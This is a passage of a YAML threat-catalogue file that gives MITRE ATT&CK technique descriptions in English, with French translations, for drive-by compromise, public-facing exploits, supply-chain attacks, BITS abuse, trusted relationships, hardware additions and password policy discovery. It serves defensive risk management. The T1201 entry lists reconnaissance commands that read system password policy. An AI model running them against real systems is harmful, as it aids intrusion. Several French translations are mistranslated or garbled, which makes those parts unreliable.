          \ en voiture :\n\n1. Un utilisateur visite un site web utilis\xE9 pour h\xE9\
          berger le contenu contr\xF4l\xE9 par l\u2019adversaire.\n2. Les scripts\
          \ s\u2019ex\xE9cutent automatiquement, en recherchant g\xE9n\xE9ralement\
          \ les versions du navigateur et des plugins pour une version potentiellement\
          \ vuln\xE9rable. L\u2019utilisateur peut \xEAtre amen\xE9 \xE0 aider dans\
          \ ce processus en activant le scripting, les notifications ou les composants\
          \ actifs du site web, et en ignorant les bo\xEEtes de dialogue d\u2019avertissement.\n\
          3. Lorsqu\u2019une version vuln\xE9rable est d\xE9tect\xE9e, le code d\u2019\
          exploitation est envoy\xE9 au navigateur.\n4. Si l\u2019exploitation r\xE9\
          ussit, l\u2019adversaire obtiendra l\u2019ex\xE9cution du code sur le syst\xE8\
          me de l\u2019utilisateur, sauf si d\u2019autres protections sont en place.\
          \ Dans certains cas, une seconde visite du site apr\xE8s le scan initial\
          \ est n\xE9cessaire avant la livraison du code d\u2019exploitation.\n\n\
          Contrairement \xE0 [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190),\
          \ l\u2019objectif de cette technique est d\u2019exploiter un logiciel sur\
          \ un point de terminaison client lors de la visite d\u2019un site web. Cela\
          \ donne g\xE9n\xE9ralement \xE0 un adversaire un acc\xE8s aux syst\xE8mes\
          \ du r\xE9seau interne plut\xF4t qu\u2019aux syst\xE8mes externes qui peuvent\
          \ \xEAtre dans une DMZ.\nhttps://attack.mitre.org/techniques/T1189"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1190
    ref_id: T1190
    name: Exploit Public-Facing Application
    description: 'Adversaries may attempt to exploit a weakness in an Internet-facing
      host or system to initially access a network. The weakness in the system can
      be a software bug, a temporary glitch, or a misconfiguration.


      Exploited applications are often websites/web servers, but can also include
      databases (like SQL), standard services (like SMB or SSH), network device administration
      and management protocols (like SNMP and Smart Install), and any other system
      with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation:
      CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure
      Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169)
      On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they
      may alternatively exploit exposed VMware vCenter servers.(Citation: Recorded
      Future ESXiArgs Ransomware 2023)(Citation: Ars Technica VMWare Code Execution
      Vulnerability 2021) Depending on the flaw being exploited, this may also involve
      [Exploitation for Stealth](https://attack.mitre.org/techniques/T1211) or [Exploitation
      for Client Execution](https://attack.mitre.org/techniques/T1203).


      If an application is hosted on cloud-based infrastructure and/or is containerized,
      then exploiting it may lead to compromise of the underlying instance or container.
      This can allow an adversary a path to access the cloud or container APIs (e.g.,
      via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)),
      exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611),
      or take advantage of weak identity and access management policies.


      Adversaries may also exploit edge network infrastructure and related appliances,
      specifically targeting devices that do not support robust host-based defenses.(Citation:
      Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)


      For websites and databases, the OWASP top 10 and CWE top 25 highlight the most
      common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top
      25)

      https://attack.mitre.org/techniques/T1190'
    translations:
      fr:
        name: Exploiter une application publique
        description: "Les adversaires peuvent tenter d\u2019exploiter une faiblesse\
          \ d\u2019un h\xF4te ou d\u2019un syst\xE8me connect\xE9 \xE0 Internet pour\
          \ acc\xE9der initialement \xE0 un r\xE9seau. La faiblesse du syst\xE8me\
          \ peut \xEAtre un bug logiciel, un bug temporaire ou une mauvaise configuration.\n\
          \nLes applications exploit\xE9es sont souvent des sites web/serveurs web,\
          \ mais peuvent aussi inclure des bases de donn\xE9es (comme SQL), des services\
          \ standards (comme SMB ou SSH), des protocoles d\u2019administration et\
          \ de gestion de dispositifs r\xE9seau (comme SNMP et Smart Install), ainsi\
          \ que tout autre syst\xE8me disposant de sockets ouverts accessibles sur\
          \ Internet. (Citation : NVD CVE-2016-6662)(Citation : Multiples vuln\xE9\
          rabilit\xE9s PME du CIS)(Citation : US-CERT TA18-106A Dispositifs d\u2019\
          infrastructure r\xE9seau 2018)(Citation : Attaques d\u2019appareils h\xE9\
          rit\xE9s du blog Cisco)(Citation : NVD CVE-2014-7169) Sur l\u2019infrastructure\
          \ ESXi, les adversaires peuvent exploiter des services OpenSLP expos\xE9\
          s ; ils peuvent aussi exploiter les serveurs VMware vCenter expos\xE9s.\
          \ (Citation : Ransomware ESXiArgs futur enregistr\xE9 2023)(Citation : Vuln\xE9\
          rabilit\xE9 d\u2019ex\xE9cution de code Ars Technica VMWare 2021) Selon\
          \ la faille exploit\xE9e, cela peut aussi impliquer [Exploitation pour la\
          \ discr\xE9tion](https://attack.mitre.org/techniques/T1211) ou [Exploitation\
          \ pour l\u2019ex\xE9cution client](https://attack.mitre.org/techniques/T1203).\n\
          \nSi une application est h\xE9berg\xE9e sur une infrastructure cloud et/ou\
          \ conteneuris\xE9e, son exploitation peut entra\xEEner la compromission\
          \ de l\u2019instance ou du conteneur sous-jacent. Cela peut permettre \xE0\
          \ un adversaire d\u2019acc\xE9der aux API cloud ou conteneurs (par exemple,\
          \ via l'[API de m\xE9tadonn\xE9es d\u2019instance cloud](https://attack.mitre.org/techniques/T1552/005)),\
          \ exploiter l\u2019acc\xE8s \xE0 l\u2019h\xF4te conteneur via [Escape to\
          \ Host](https://attack.mitre.org/techniques/T1611), ou profiter de politiques\
          \ faibles de gestion des identit\xE9s et des acc\xE8s.\n\nLes adversaires\
          \ peuvent \xE9galement exploiter l\u2019infrastructure r\xE9seau de p\xE9\
          riph\xE9rie et les appliances associ\xE9es, ciblant sp\xE9cifiquement des\
          \ dispositifs ne supportant pas de d\xE9fenses robustes bas\xE9es sur l\u2019\
          h\xF4te. (Citation : Mandiant Fortinet Zero Day)(Citation : Cyberguerre\
          \ de la Russie c\xE2bl\xE9e)\n\nPour les sites web et bases de donn\xE9\
          es, le top 10 OWASP et le top 25 CWE mettent en avant les vuln\xE9rabilit\xE9\
          s web les plus courantes. (Citation : Top 10 OWASP)(Citation : Top 25 CWE)\n\
          https://attack.mitre.org/techniques/T1190"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1195
    ref_id: T1195
    name: Supply Chain Compromise
    description: "Adversaries may manipulate products or product delivery mechanisms\
      \ prior to receipt by a final consumer for the purpose of data or system compromise.\n\
      \nSupply chain compromise can take place at any stage of the supply chain including:\n\
      \n* Manipulation of development tools\n* Manipulation of a development environment\n\
      * Manipulation of source code repositories (public or private)\n* Manipulation\
      \ of source code in open-source dependencies\n* Manipulation of software update/distribution\
      \ mechanisms\n* Compromised/infected system images (removable media infected\
      \ at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware)\
      \ \n* Replacement of legitimate software with modified versions\n* Sales of\
      \ modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\
      \nWhile supply chain compromise can impact any component of hardware or software,\
      \ adversaries looking to gain execution have often focused on malicious additions\
      \ to legitimate software in software distribution or update channels.(Citation:\
      \ Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five\
      \ SK 2011) Adversaries may limit targeting to a desired victim set or distribute\
      \ malicious software to a broad set of consumers but only follow up with specific\
      \ victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3\
      \ 2018)(Citation: Command Five SK 2011) Popular open-source projects that are\
      \ used as dependencies in many applications may also be targeted as a means\
      \ to add malicious code to users of the dependency.(Citation: Trendmicro NPM\
      \ Compromise)\n\nIn some cases, adversaries may conduct \u201Csecond-order\u201D\
      \ supply chain compromises by leveraging the access gained from an initial supply\
      \ chain compromise to further compromise a software component.(Citation: Krebs\
      \ 3cx overview 2023) This may allow the threat actor to spread to even more\
      \ victims.\nhttps://attack.mitre.org/techniques/T1195"
    translations:
      fr:
        name: "Compromis de la cha\xEEne d\u2019approvisionnement"
        description: "Les adversaires peuvent manipuler des produits ou des m\xE9\
          canismes de livraison avant leur r\xE9ception par un consommateur final\
          \ dans le but de compromettre des donn\xE9es ou du syst\xE8me.\n\nLa compromission\
          \ de la cha\xEEne d\u2019approvisionnement peut avoir lieu \xE0 n\u2019\
          importe quelle \xE9tape de la cha\xEEne d\u2019approvisionnement, notamment\
          \ :\n\n* Manipulation des outils de d\xE9veloppement\n* Manipulation d\u2019\
          un environnement de d\xE9veloppement\n* Manipulation des d\xE9p\xF4ts de\
          \ code source (publics ou priv\xE9s)\n* Manipulation du code source dans\
          \ les d\xE9pendances open source\n* Manipulation des m\xE9canismes de mise\
          \ \xE0 jour/distribution logicielle\n* Images syst\xE8me compromises/infect\xE9\
          es (supports amovibles infect\xE9s en usine) (Citation : IBM Storwize) (Citation\
          \ : Schneider Electric USB Malware) \n* Remplacement des logiciels l\xE9\
          gitimes par des versions modifi\xE9es\n* Vente de produits modifi\xE9s/contrefaits\
          \ \xE0 des distributeurs l\xE9gitimes\n* Interdiction des exp\xE9ditions\n\
          \nBien que la compromission de la cha\xEEne d\u2019approvisionnement puisse\
          \ affecter n\u2019importe quel composant du mat\xE9riel ou du logiciel,\
          \ les adversaires cherchant \xE0 obtenir l\u2019ex\xE9cution se sont souvent\
          \ concentr\xE9s sur des ajouts malveillants \xE0 des logiciels l\xE9gitimes\
          \ dans la distribution ou les canaux de mise \xE0 jour. (Citation : Avast\
          \ CCleaner3 2018)(Citation : Microsoft Dofoil 2018)(Citation : Commandement\
          \ Cinq SK 2011) Les adversaires peuvent limiter le ciblage \xE0 un ensemble\
          \ de victimes souhait\xE9es ou distribuer des logiciels malveillants \xE0\
          \ un large \xE9ventail de consommateurs, mais ne suivre que des victimes\
          \ sp\xE9cifiques. (Citation : Symantec Elderwood sept. 2012)(Citation :\
          \ Avast CCleaner3 2018)(Citation : Commandement Cinq SK 2011) Les projets\
          \ open source populaires utilis\xE9s comme d\xE9pendances dans de nombreuses\
          \ applications peuvent \xE9galement \xEAtre cibl\xE9s comme moyen d\u2019\
          ajouter du code malveillant aux utilisateurs de la d\xE9pendance. (Citation\
          \ : Compromis Trendmicro NPM)\n\nDans certains cas, les adversaires peuvent\
          \ effectuer des compromis de cha\xEEne d\u2019approvisionnement \xAB de\
          \ second ordre \xBB en tirant parti de l\u2019acc\xE8s obtenu lors d\u2019\
          une compromission initiale de la cha\xEEne d\u2019approvisionnement pour\
          \ compromettre davantage un composant logiciel. (Citation : Aper\xE7u de\
          \ Krebs 3cx 2023) Cela pourrait permettre \xE0 l\u2019acteur de malmener\
          \ de se propager \xE0 encore plus de victimes.\nhttps://attack.mitre.org/techniques/T1195"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1195.001
    ref_id: T1195.001
    name: Compromise Software Dependencies and Development Tools
    description: 'Adversaries may manipulate software dependencies and development
      tools prior to receipt by a final consumer for the purpose of data or system
      compromise. Applications often depend on external software to function properly.
      Popular open source projects that are used as dependencies in many applications,
      such as pip and NPM packages, may be targeted as a means to add malicious code
      to users of the dependency.(Citation: Trendmicro NPM Compromise)(Citation: Bitdefender
      NPM Repositories Compromised 2021)(Citation: MANDVI Malicious npm and PyPI Packages
      Disguised) This may also include abandoned packages, which in some cases could
      be re-registered by threat actors after being removed by adversaries.(Citation:
      The Hacker News PyPi Revival Hijack 2024) Adversaries may also employ "typosquatting"
      or name-confusion by choosing names similar to existing popular libraries or
      packages in order to deceive a user.(Citation: Ahmed Backdoors in Python and
      NPM Packages)(Citation: Meyer PyPI Supply Chain Attack Uncovered)(Citation:
      Checkmarx-oss-seo)


      Additionally, CI/CD pipeline components, such as GitHub Actions, may be targeted
      in order to gain access to the building, testing, and deployment cycles of an
      application.(Citation: Unit 42 Palo Alto GitHub Actions Supply Chain Attack
      2025) By adding malicious code into a GitHub action, a threat actor may be able
      to collect runtime credentials (e.g., via [Proc Filesystem](https://attack.mitre.org/techniques/T1003/007))
      or insert further malicious components into the build pipelines for a second-order
      supply chain compromise.(Citation: OWASP CICD-SEC-4) As GitHub Actions are often
      dependent on other GitHub Actions, threat actors may be able to infect a large
      number of repositories via the compromise of a single Action.(Citation: Palo
      Alto Networks GitHub Actions Worm 2023)


      Targeting may be specific to a desired victim set or may be distributed to a
      broad set of consumers but only move on to additional tactics on specific victims.

      https://attack.mitre.org/techniques/T1195/001'
    translations:
      fr:
        name: "Compromission des d\xE9pendances logicielles et des outils de d\xE9\
          veloppement"
        description: "Les adversaires peuvent manipuler des d\xE9pendances logicielles\
          \ et des outils de d\xE9veloppement avant leur r\xE9ception par un consommateur\
          \ final dans le but de compromettre des donn\xE9es ou du syst\xE8me. Les\
          \ applications d\xE9pendent souvent de logiciels externes pour fonctionner\
          \ correctement. Les projets open source populaires utilis\xE9s comme d\xE9\
          pendances dans de nombreuses applications, tels que les paquets pip et NPM,\
          \ peuvent \xEAtre cibl\xE9s comme moyen d\u2019ajouter du code malveillant\
          \ aux utilisateurs de la d\xE9pendance. (Citation : Compromis Trendmicro\
          \ NPM)(Citation : D\xE9p\xF4ts NPM Bitdefender compromis en 2021)(Citation\
          \ : MANDVI Packages malveillants npm et PyPI d\xE9guis\xE9s) Cela peut \xE9\
          galement inclure des colis abandonn\xE9s, qui dans certains cas peuvent\
          \ \xEAtre r\xE9enregistr\xE9s par des acteurs malveillants apr\xE8s avoir\
          \ \xE9t\xE9 retir\xE9s par des adversaires. (Citation : Le d\xE9tournement\
          \ de la renaissance du PyPi de Hacker News 2024) Les adversaires peuvent\
          \ \xE9galement recourir au \xAB typosquatting \xBB ou \xE0 la confusion\
          \ de noms en choisissant des noms similaires \xE0 des biblioth\xE8ques ou\
          \ packages populaires existants afin de tromper un utilisateur. (Citation\
          \ : Portes d\xE9rob\xE9es d\u2019Ahmed dans les paquets Python et NPM)(Citation\
          \ : Attaque de la cha\xEEne d\u2019approvisionnement Meyer PyPI d\xE9couverte\
          \ au d\xE9couvert)(Citation : Checkmarx-oss-seo)\n\nDe plus, les composants\
          \ du pipeline CI/CD, tels que les actions GitHub, peuvent \xEAtre cibl\xE9\
          s afin d\u2019acc\xE9der aux cycles de construction, de test et de d\xE9\
          ploiement d\u2019une application. (Citation : Attaque de la cha\xEEne d\u2019\
          approvisionnement 2025 des actions GitHub de l\u2019unit\xE9 42 Palo Alto)\
          \ En ajoutant du code malveillant dans une action GitHub, un acteur de menace\
          \ peut collecter des identifiants d\u2019ex\xE9cution (par exemple, via\
          \ [Proc\xE9s Filesystem](https://attack.mitre.org/techniques/T1003/007))\
          \ ou ins\xE9rer d\u2019autres composants malveillants dans les pipelines\
          \ de construction pour une compromission de la cha\xEEne d\u2019approvisionnement\
          \ de second ordre. (Citation : OWASP CICD-SEC-4) Comme les actions GitHub\
          \ d\xE9pendent souvent d\u2019autres actions GitHub, les acteurs malveillants\
          \ peuvent \xEAtre capables d\u2019infecter un grand nombre de d\xE9p\xF4\
          ts via la compromission d\u2019une seule action. (Citation : Ver actions\
          \ GitHub Palo Alto Networks 2023)\n\nLe ciblage peut \xEAtre sp\xE9cifique\
          \ \xE0 un ensemble de victimes souhait\xE9 ou \xEAtre distribu\xE9 \xE0\
          \ un large \xE9ventail de consommateurs, mais ne passer qu\u2019\xE0 des\
          \ tactiques suppl\xE9mentaires pour des victimes sp\xE9cifiques.\nhttps://attack.mitre.org/techniques/T1195/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1195.002
    ref_id: T1195.002
    name: Compromise Software Supply Chain
    description: 'Adversaries may manipulate application software prior to receipt
      by a final consumer for the purpose of data or system compromise. Supply chain
      compromise of software can take place in a number of ways, including manipulation
      of the application source code, manipulation of the update/distribution mechanism
      for that software, or replacing compiled releases with a modified version.


      Targeting may be specific to a desired victim set or may be distributed to a
      broad set of consumers but only move on to additional tactics on specific victims.(Citation:
      Avast CCleaner3 2018)(Citation: Command Five SK 2011)

      https://attack.mitre.org/techniques/T1195/002'
    translations:
      fr:
        name: "Cha\xEEne d\u2019approvisionnement logicielle de compromis"
        description: "Les adversaires peuvent manipuler un logiciel applicatif avant\
          \ leur r\xE9ception par un consommateur final dans le but de compromettre\
          \ les donn\xE9es ou le syst\xE8me. La compromission de la cha\xEEne d\u2019\
          approvisionnement logicielle peut se produire de plusieurs mani\xE8res,\
          \ notamment la manipulation du code source de l\u2019application, la manipulation\
          \ du m\xE9canisme de mise \xE0 jour/distribution de ce logiciel, ou le remplacement\
          \ des versions compil\xE9es par une version modifi\xE9e.\n\nLe ciblage peut\
          \ \xEAtre sp\xE9cifique \xE0 un ensemble de victimes souhait\xE9 ou \xEA\
          tre distribu\xE9 \xE0 un large \xE9ventail de consommateurs, mais ne passer\
          \ qu\u2019\xE0 des tactiques suppl\xE9mentaires pour des victimes sp\xE9\
          cifiques. (Citation : Avast CCleaner3 2018)(Citation : Commandement Cinq\
          \ SK 2011)\nhttps://attack.mitre.org/techniques/T1195/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1195.003
    ref_id: T1195.003
    name: Compromise Hardware Supply Chain
    description: 'Adversaries may manipulate hardware components in products prior
      to receipt by a final consumer for the purpose of data or system compromise.
      By modifying hardware or firmware in the supply chain, adversaries can insert
      a backdoor into consumer networks that may be difficult to detect and give the
      adversary a high degree of control over the system. Hardware backdoors may be
      inserted into various devices, such as servers, workstations, network infrastructure,
      or peripherals.

      https://attack.mitre.org/techniques/T1195/003'
    translations:
      fr:
        name: "Compromis de la cha\xEEne d\u2019approvisionnement mat\xE9rielle"
        description: "Les adversaires peuvent manipuler les composants mat\xE9riels\
          \ des produits avant leur r\xE9ception par un consommateur final dans le\
          \ but de compromettre des donn\xE9es ou du syst\xE8me. En modifiant le mat\xE9\
          riel ou le firmware dans la cha\xEEne d\u2019approvisionnement, les adversaires\
          \ peuvent ins\xE9rer une porte d\xE9rob\xE9e dans les r\xE9seaux grand public\
          \ qui peut \xEAtre difficile \xE0 d\xE9tecter et conf\xE8re \xE0 l\u2019\
          adversaire un haut degr\xE9 de contr\xF4le sur le syst\xE8me. Les portes\
          \ d\xE9rob\xE9es mat\xE9rielles peuvent \xEAtre ins\xE9r\xE9es dans divers\
          \ appareils, tels que des serveurs, postes de travail, infrastructures r\xE9\
          seau ou p\xE9riph\xE9riques.\nhttps://attack.mitre.org/techniques/T1195/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1197
    ref_id: T1197
    name: BITS Jobs
    description: 'Adversaries may abuse BITS jobs to persistently execute code and
      perform various background tasks. Windows Background Intelligent Transfer Service
      (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through
      [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation:
      Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters,
      messengers, and other applications preferred to operate in the background (using
      available idle bandwidth) without interrupting other networked applications.
      File transfer tasks are implemented as BITS jobs, which contain a queue of one
      or more file operations.


      The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001)
      and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation:
      Microsoft BITS)(Citation: Microsoft BITSAdmin)


      Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)),
      execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)).
      BITS tasks are self-contained in the BITS job database, without new files or
      registry modifications, and often permitted by host firewalls.(Citation: CTU
      BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation:
      Symantec BITS May 2007) BITS enabled execution may also enable persistence by
      creating long-standing jobs (the default maximum lifetime is 90 days and extendable)
      or invoking an arbitrary program when a job completes or errors (including after
      system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware
      June 2016)


      BITS upload functionalities can also be used to perform [Exfiltration Over Alternative
      Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware
      June 2016)

      https://attack.mitre.org/techniques/T1197'
    translations:
      fr:
        name: Emplois BITS
        description: "Les adversaires peuvent abuser des t\xE2ches BITS pour ex\xE9\
          cuter du code de fa\xE7on persistante et effectuer diverses t\xE2ches en\
          \ arri\xE8re-plan. Le Service de transfert intelligent en arri\xE8re-plan\
          \ de Windows (BITS) est un m\xE9canisme de transfert de fichiers asynchrone\
          \ et \xE0 faible bande passante expos\xE9 via le [Component Object Model](https://attack.mitre.org/techniques/T1559/001)\
          \ (COM). (Citation : Microsoft COM)(Citation : Microsoft BITS) BITS est\
          \ couramment utilis\xE9 par les mises \xE0 jour, messagers et autres applications\
          \ pr\xE9f\xE9r\xE9es pour fonctionner en arri\xE8re-plan (utilisant la bande\
          \ passante disponible en inactivit\xE9) sans interrompre d\u2019autres applications\
          \ en r\xE9seau. Les t\xE2ches de transfert de fichiers sont impl\xE9ment\xE9\
          es sous forme de t\xE2ches BITS, qui contiennent une file d\u2019attente\
          \ d\u2019une ou plusieurs op\xE9rations de fichiers.\n\nL\u2019interface\
          \ pour cr\xE9er et g\xE9rer les emplois BITS est accessible via [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ et l\u2019outil [BITSAdmin](https://attack.mitre.org/software/S0190).\
          \ (Citation : Microsoft BITS)(Citation : Microsoft BITSAdmin)\n\nLes adversaires\
          \ peuvent abuser de BITS pour t\xE9l\xE9charger (par exemple [Ingress Tool\
          \ Transfer](https://attack.mitre.org/techniques/T1105)), ex\xE9cuter, voire\
          \ nettoyer apr\xE8s avoir ex\xE9cut\xE9 du code malveillant (par exemple\
          \ [Indication Removal](https://attack.mitre.org/techniques/T1070)). Les\
          \ t\xE2ches BITS sont autonomes dans la base de donn\xE9es des t\xE2ches\
          \ BITS, sans nouveaux fichiers ni modifications du registre, et souvent\
          \ autoris\xE9es par les pare-feux h\xF4tes. (Citation : Malware CTU BITS\
          \ juin 2016)(Citation : Mondok Windows PiggyBack BITS mai 2007)(Citation\
          \ : Symantec BITS mai 2007) L\u2019ex\xE9cution activ\xE9e par BITS peut\
          \ \xE9galement permettre la persistance en cr\xE9ant des t\xE2ches de longue\
          \ dur\xE9e (la dur\xE9e de vie maximale par d\xE9faut est de 90 jours et\
          \ prolongable) ou en invoquant un programme arbitraire lorsqu\u2019une t\xE2\
          che se termine ou s\u2019applique \xE0 une erreur (y compris apr\xE8s un\
          \ red\xE9marrage syst\xE8me). (Citation : PaloAlto UBoatRAT nov. 2017)(Citation\
          \ : Malware CTU BITS juin 2016)\n\nLes fonctionnalit\xE9s de t\xE9l\xE9\
          versement BITS peuvent \xE9galement \xEAtre utilis\xE9es pour effectuer\
          \ [Exfiltration sur protocole alternatif](https://attack.mitre.org/techniques/T1048).\
          \ (Citation : Malware CTU BITS juin 2016)\nhttps://attack.mitre.org/techniques/T1197"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1199
    ref_id: T1199
    name: Trusted Relationship
    description: 'Adversaries may breach or otherwise leverage organizations who have
      access to intended victims. Access through trusted third party relationship
      abuses an existing connection that may not be protected or receives less scrutiny
      than standard mechanisms of gaining access to a network.


      Organizations often grant elevated access to second or third-party external
      providers in order to allow them to manage internal systems as well as cloud-based
      environments. Some examples of these relationships include IT services contractors,
      managed security providers, infrastructure contractors (e.g. HVAC, elevators,
      physical security). The third-party provider''s access may be intended to be
      limited to the infrastructure being maintained, but may exist on the same network
      as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      used by the other party for access to internal network systems may be compromised
      and used.(Citation: CISA IT Service Providers)


      In Office 365 environments, organizations may grant Microsoft partners or resellers
      delegated administrator permissions. By compromising a partner or reseller account,
      an adversary may be able to leverage existing delegated administrator relationships
      or send new delegated administrator offers to clients in order to gain administrative
      control over the victim tenant.(Citation: Office 365 Delegated Administration)

      https://attack.mitre.org/techniques/T1199'
    translations:
      fr:
        name: Relation de confiance
        description: "Les adversaires peuvent violer ou tirer parti d\u2019organisations\
          \ ayant acc\xE8s aux victimes vis\xE9es. L\u2019acc\xE8s via une relation\
          \ de confiance avec un tiers abuse d\u2019une connexion existante qui peut\
          \ ne pas \xEAtre prot\xE9g\xE9e ou fait l\u2019objet d\u2019un contr\xF4\
          le moindre que les m\xE9canismes standards d\u2019acc\xE8s \xE0 un r\xE9\
          seau.\n\nLes organisations accordent souvent un acc\xE8s accru \xE0 des\
          \ fournisseurs externes secondes ou tiers afin de leur permettre de g\xE9\
          rer des syst\xE8mes internes ainsi que des environnements bas\xE9s sur le\
          \ cloud. Quelques exemples de ces relations incluent les prestataires de\
          \ services informatiques, les prestataires de s\xE9curit\xE9 g\xE9r\xE9\
          e, les entrepreneurs en infrastructures (par exemple, CVC, ascenseurs, s\xE9\
          curit\xE9 physique). L\u2019acc\xE8s du fournisseur tiers peut \xEAtre destin\xE9\
          \ \xE0 \xEAtre limit\xE9 \xE0 l\u2019infrastructure maintenue, mais peut\
          \ exister sur le m\xEAme r\xE9seau que le reste de l\u2019entreprise. Ainsi,\
          \ les [comptes valides](https://attack.mitre.org/techniques/T1078) utilis\xE9\
          s par l\u2019autre partie pour acc\xE9der aux syst\xE8mes r\xE9seau internes\
          \ peuvent \xEAtre compromis et utilis\xE9s. (Citation : Fournisseurs de\
          \ services informatiques CISA)\n\nDans les environnements Office 365, les\
          \ organisations peuvent accorder aux partenaires Microsoft ou aux revendeurs\
          \ des autorisations d\u2019administrateur d\xE9l\xE9gu\xE9es. En compromettant\
          \ un compte partenaire ou revendeur, un adversaire peut tirer parti des\
          \ relations existantes avec un administrateur d\xE9l\xE9gu\xE9 ou envoyer\
          \ de nouvelles offres d\u2019administrateur d\xE9l\xE9gu\xE9 aux clients\
          \ afin d\u2019obtenir le contr\xF4le administratif sur le locataire victime.\
          \ (Citation : Office 365 Administration d\xE9l\xE9gu\xE9e)\nhttps://attack.mitre.org/techniques/T1199"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1200
    ref_id: T1200
    name: Hardware Additions
    description: 'Adversaries may physically introduce computer accessories, networking
      hardware, or other computing devices into a system or network that can be used
      as a vector to gain access. Rather than just connecting and distributing payloads
      via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)),
      more robust hardware additions can be used to introduce new functionalities
      and/or features into a system that can then be abused.


      While public references of usage by threat actors are scarce, many red teams/penetration
      testers leverage hardware additions for initial access. Commercial and open
      source products can be leveraged with capabilities such as passive network tapping,
      network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)),
      keystroke injection, kernel memory reading via DMA, addition of new wireless
      access points to an existing network, and others.(Citation: Ossmann Star Feb
      2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation:
      McMillan Pwn March 2012)

      https://attack.mitre.org/techniques/T1200'
    translations:
      fr:
        name: "Ajouts mat\xE9riels"
        description: "Les adversaires peuvent introduire physiquement des accessoires\
          \ informatiques, du mat\xE9riel r\xE9seau ou d\u2019autres dispositifs informatiques\
          \ dans un syst\xE8me ou un r\xE9seau pouvant servir de vecteur pour acc\xE9\
          der \xE0 l\u2019ordinateur. Plut\xF4t que de simplement connecter et distribuer\
          \ les charges utiles via un stockage amovible (c\u2019est-\xE0-dire [R\xE9\
          plication via des m\xE9dias amovibles](https://attack.mitre.org/techniques/T1091)),\
          \ des ajouts mat\xE9riels plus robustes peuvent \xEAtre utilis\xE9s pour\
          \ introduire de nouvelles fonctionnalit\xE9s et/ou fonctionnalit\xE9s dans\
          \ un syst\xE8me qui peuvent ensuite \xEAtre abus\xE9es.\n\nBien que les\
          \ r\xE9f\xE9rences publiques \xE0 l\u2019utilisation par des acteurs malveillants\
          \ soient rares, de nombreuses \xE9quipes rouges/testeurs d\u2019intrusion\
          \ exploitent les ajouts mat\xE9riels pour un acc\xE8s initial. Les produits\
          \ commerciaux et open source peuvent \xEAtre exploit\xE9s avec des fonctionnalit\xE9\
          s telles que l\u2019\xE9coute passive du r\xE9seau, la modification du trafic\
          \ r\xE9seau (c\u2019est-\xE0-dire [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)),\
          \ l\u2019injection de frappes clavier, la lecture de m\xE9moire du noyau\
          \ via DMA, l\u2019ajout de nouveaux points d\u2019acc\xE8s sans fil \xE0\
          \ un r\xE9seau existant, et d\u2019autres. (Citation : Ossmann Star, f\xE9\
          vr. 2011)(Citation : Aleks Weapons nov. 2015)(Citation : Frisk DMA ao\xFB\
          t 2016)(Citation : McMillan Pwn mars 2012)\nhttps://attack.mitre.org/techniques/T1200"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1201
    ref_id: T1201
    name: Password Policy Discovery
    description: 'Adversaries may attempt to access detailed information about the
      password policy used within an enterprise network or cloud environment. Password
      policies are a way to enforce complex passwords that are difficult to guess
      or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This
      information may help the adversary to create a list of common passwords and
      launch dictionary and/or brute force attacks which adheres to the policy (e.g.
      if the minimum password length should be 8, then not trying passwords such as
      ''pass123''; not checking for more than 3-4 passwords per account if the lockout
      is set to 6 as to not lock out accounts).


      Password policies can be set and discovered on Windows, Linux, and macOS systems
      via various command shell utilities such as <code>net accounts (/domain)</code>,
      <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>,
      <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code>
      (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password
      Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      on network devices to discover password policy information (e.g. <code>show
      aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)


      Password policies can be discovered in cloud environments using available APIs
      such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).

